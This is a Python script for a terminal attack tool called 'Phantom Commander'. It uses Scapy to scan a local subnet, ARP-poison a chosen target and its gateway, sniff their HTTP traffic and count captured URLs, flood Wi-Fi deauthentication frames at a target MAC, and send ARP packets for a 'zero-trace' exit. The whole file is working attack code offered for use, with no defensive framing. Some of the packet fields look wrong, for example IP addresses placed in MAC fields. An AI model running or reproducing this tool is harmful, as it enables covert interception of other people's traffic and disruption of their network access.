#!/usr/bin/env python3
# PHANTOM COMMANDER: ZERO-TRACE (GOD VIEWPORT)
# Engine: Scapy + Multiprocessing + Rich UI + Auto-Discovery

import os, sys, time, socket, signal, ipaddress, multiprocessing
from multiprocessing import Process, Queue, Event
from threading import Thread
from rich.console import Console, Group
from rich.table import Table
from rich.panel import Panel
from rich.live import Live
from rich.text import Text
from rich.layout import Layout
from rich import box
from rich.columns import Columns
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from scapy.all import *

# --- Silent Scapy ---
conf.verb = 0
log_levels["scapy.runtime"] = 0

class Dashboard:
    def __init__(self):
        self.console = Console()
        self.buffer = []
        self.status = "IDLE"
        
        # Auto-discovery
        try:
            self.interface = conf.iface or "eth0"
            self.gw_ip = conf.route.route("0.0.0.0")[2]
            self.local_ip = get_if_addr(self.interface)
            self.subnet = ".".join(self.local_ip.split('.')[:-1]) + ".0/24"
        except:
            self.interface = "eth0"
            self.gw_ip = "192.168.1.1"
            self.subnet = "192.168.1.0/24"

        self.target_ip = "NOT_SET"
        self.target_mac = "00:00:00:00:00:00"
        self.bssid = "00:00:00:00:00:00"
        self.packets_sent = 0
        self.urls_captured = 0
        self.scan_count = 0
        
        # Phone viewport state
        self.phone_status = "OFFLINE"
        self.phone_color = "dim white"
        self.device_model = "UNKNOWN"
        self.attack_animation = ""

    def resolve_device_name(self, ip):
        try:
            mac = getmacbyip(ip)
            if mac:
                prefix = mac.lower().replace(":", "")[:6]
                if prefix.startswith(("fc", "001", "d0", "ac")): return "iPhone"
                elif prefix.startswith(("50", "34", "a8")): return "Samsung"
                elif prefix.startswith(("00", "bc")): return "Huawei/Android"
                return "Mobile Device"
        except: pass
        return "Generic Host"

    def resolve_target_mac(self):
        if self.target_ip != "NOT_SET":
            try:
                mac = getmacbyip(self.target_ip)
                if mac:
                    self.target_mac = mac
                    self.bssid = mac
                    return self.target_mac
            except: pass
        return self.target_mac

    def update_log(self, msg):
        self.buffer.append(msg)
        if len(self.buffer) > 60: self.buffer = self.buffer[-60:]
        if "ACTIVE" in msg or "START" in msg:
            self.phone_status = "CONNECTED"
            self.phone_color = "bold green"
            if self.target_ip != "NOT_SET":
                self.device_model = self.resolve_device_name(self.target_ip)
        elif "COMPLETE" in msg or "IDLE" in msg:
            self.phone_status = "STANDBY"
            self.phone_color = "bold yellow"

    def parse_log(self, msg):
        if "URL:" in msg: self.urls_captured += 1
        if "Deauth Packets Sent:" in msg:
            self.packets_sent = int(msg.split(": ")[1])
        if "IP:" in msg and "SCAN" not in msg: self.scan_count += 1

    def render(self) -> Layout:
        root = Layout()
        root.split_column(
            Layout(name="header", size=6),
            Layout(name="body"),
            Layout(name="footer", size=3)
        )
        root["body"].split_row(
            Layout(name="phone_view", ratio=1),
            Layout(name="main_ui", ratio=2)
        )

        ascii_art = r"""
[bold cyan]        ________________________
        |  PHANTOM COMMANDER   |
        |   ZERO-TRACE GOD MODE   |
        |________________________|[/bold cyan]
        """
        header_text = f"""
{ascii_art}
[bold magenta]IFACE: {self.interface}   GW: {self.gw_ip}   SUBNET: {self.subnet}[/bold magenta]
        """
        root["header"].update(Panel(header_text, border_style="bright_blue", box=box.DOUBLE))

        phone_ascii = f"""
[bold white]  .───────────────────.[/bold white]
[bold white]  │ [cyan]PHANTOM VIEWPORT[/cyan]  │[/bold white]
[bold white]  :───────────────────:[/bold white]
[bold white]  │ [yellow]{self.device_model:^15}[/yellow] │[/bold white]
[bold white]  │                     │[/bold white]
[bold white]  │   [{self.phone_color}]{self.phone_status:^11}[/{self.phone_color}]   │[/bold white]
[bold white]  │                     │[/bold white]
[bold white]  │ [dim]SYNC...[/dim] [green]██████████[/green] │[/bold white]
[bold white]  │                     │[/bold white]
[bold white]  │ [blue]DATA FLOW[/blue]           │[/bold white]
[bold white]  │ [green]>> OK[/green]               │[/bold white]
[bold white]  │                     │[/bold white]
[bold white]  │    {self.attack_animation:^12}    │[/bold white]
[bold white]  │                     │[/bold white]
[bold white]  '─────────[◯]─────────'[/bold white]
        """
        root["phone_view"].update(Panel(phone_ascii, title="[bold red]LIVE VIEWPORT[/bold red]", border_style="red"))

        table = Table(title="TELEMETRY", box=box.ROUNDED, title_style="bold cyan", expand=True)
        table.add_column("PARAM", style="cyan")
        table.add_column("VALUE", style="green")
        table.add_row("STATUS", self.status)
        table.add_row("TARGET IP", self.target_ip)
        table.add_row("TARGET MAC", self.target_mac)
        table.add_row("PACKETS SENT", str(self.packets_sent))
        table.add_row("URLS CAPTURED", str(self.urls_captured))
        table.add_row("HOSTS FOUND", str(self.scan_count))

        log_panel = Panel("\n".join(self.buffer[-10:]), title="[bold magenta]STREAM LOG[/bold magenta]", border_style="magenta")
        root["main_ui"].update(Group(table, log_panel))

        progress = Progress(
            SpinnerColumn(),
            TextColumn("[bold yellow]{task.description}"),
            BarColumn(bar_width=40),
            TimeElapsedColumn(),
        )
        task = progress.add_task("STANDBY", total=100)
        if self.status == "RUNNING":
            progress.update(task, description="ATTACK IN PROGRESS", completed=50)
        else:
            progress.update(task, description="IDLE", completed=0)
        root["footer"].update(Panel(progress, border_style="cyan", box=box.SQUARE))

        return root


# ================= WORKERS (untouched) =================
def ghost_scan_worker(interface, subnet, log_queue, term_event):
    try:
        iface = interface or conf.iface
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=subnet), timeout=2, iface=iface, inter=0.01)
        log_queue.put("SCAN_START | Searching Network...")
        for snd, rcv in ans:
            if term_event.is_set(): break
            log_queue.put(f"IP: {rcv[ARP].psrc} | MAC: {rcv[Ether].src}")
        log_queue.put("SCAN_COMPLETE")
    except Exception as e: log_queue.put(f"ERROR: {e}")

def silent_mitm_worker(interface, target_ip, gw_ip, log_queue, term_event):
    try:
        iface = interface or conf.iface
        def poison():
            while not term_event.is_set():
                sendp(Ether(dst=target_ip)/ARP(op=2, psrc=gw_ip, pdst=target_ip), iface=iface, verbose=False)
                sendp(Ether(dst=gw_ip)/ARP(op=2, psrc=target_ip, pdst=gw_ip), iface=iface, verbose=False)
                time.sleep(5)
        Thread(target=poison, daemon=True).start()
        log_queue.put("MITM_START | Capturing Traffic")
        sniff(filter="tcp port 80", prn=lambda p: log_queue.put(f"URL: {p[Raw].load.decode()[:30]}") if p.haslayer(Raw) else None, iface=iface, stop_filter=lambda x: term_event.is_set())
    except Exception as e: log_queue.put(f"ERROR: {e}")

def wifi_void_worker(interface, target_mac, bssid, log_queue, term_event):
    try:
        log_queue.put("VOID_START | Flooding Deauth")
        count = 0
        while not term_event.is_set():
            sendp(Dot11(type=0, subtype=12, addr1=target_mac, addr2=bssid, addr3=bssid)/Dot11Deauth(), iface=interface, verbose=False)
            count += 1
            if count % 50 == 0: log_queue.put(f"Deauth Packets Sent: {count}")
    except Exception as e: log_queue.put(f"ERROR: {e}")

def surgical_exit_worker(interface, target_ip, gw_ip, log_queue, term_event):
    try:
        iface = interface or conf.iface
        target_mac = getmacbyip(target_ip)
        gw_mac = getmacbyip(gw_ip)
        log_queue.put("EXIT_START | Hard-Reset Sequence")
        for _ in range(20):
            pkt1 = Ether(src=get_if_addr(iface), dst=gw_mac)/ARP(op="is-at", psrc=gw_ip, pdst=target_ip, hwsrc=target_mac, hwdst=gw_mac)
            pkt2 = Ether(src=gw_mac, dst=target_mac)/ARP(op="is-at", psrc=target_ip, pdst=gw_ip, hwsrc=gw_ip, hwdst=target_ip)
            sendp(pkt1, iface=iface, verbose=False)
            sendp(pkt2, iface=iface, verbose=False)
            time.sleep(0.02)
        log_queue.put("EXIT_COMPLETE | Zero-Trace Exit")
    except Exception as e: log_queue.put(f"EXIT_ERROR: {e}")

# ================= MAIN =================
def main():
    dash = Dashboard()
    queue = Queue()
    term_event = Event()
    
    with Live(dash.render(), refresh_per_second=10, screen=True) as live:
        while True:
            while not queue.empty():
                msg = queue.get_nowait()
                dash.update_log(msg)
                dash.parse_log(msg)
            live.update(dash.render())

            if dash.status == "IDLE":
                dash.console.print("\n[1] SCAN [2] MITM [3] VOID [4] EXIT-TRACE [S] SET TARGET [0] EXIT", justify="center")
                choice = input(">> ").strip().lower()
                
                if choice == '0': break
                if choice == 's':
                    dash.target_ip = input("Enter Target IP: ").strip()
                    dash.resolve_target_mac()
                    if dash.target_mac != "00:00:00:00:00:00":
                        dash.console.print(f"[green]MAC resolved: {dash.target_mac}[/green]")
                    else:
                        dash.console.print("[yellow]Could not resolve MAC. Set manually if needed.[/yellow]")
                    continue

                term_event.clear()
                dash.status = "RUNNING"
                
                if choice == '1': 
                    p = Process(target=ghost_scan_worker, args=(dash.interface, dash.subnet, queue, term_event))
                elif choice == '2': 
                    p = Process(target=silent_mitm_worker, args=(dash.interface, dash.target_ip, dash.gw_ip, queue, term_event))
                elif choice == '3': 
                    if dash.target_mac == "00:00:00:00:00:00":
                        dash.console.print("[bold red]Error: Target MAC not set. Use SCAN or Set Target first.[/bold red]")
                        dash.status = "IDLE"
                        continue
                    p = Process(target=wifi_void_worker, args=(dash.interface, dash.target_mac, dash.bssid, queue, term_event))
                elif choice == '4': 
                    p = Process(target=surgical_exit_worker, args=(dash.interface, dash.target_ip, dash.gw_ip, queue, term_event))
                else:
                    dash.status = "IDLE"
                    continue
                
                p.start()
                while p.is_alive():
                    while not queue.empty():
                        msg = queue.get_nowait()
                        dash.update_log(msg)
                    live.update(dash.render())
                    if term_event.is_set(): break
                    time.sleep(0.1)
                dash.status = "IDLE"

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("CRITICAL: Root required. Run with sudo.")
        sys.exit(1)
    main()   
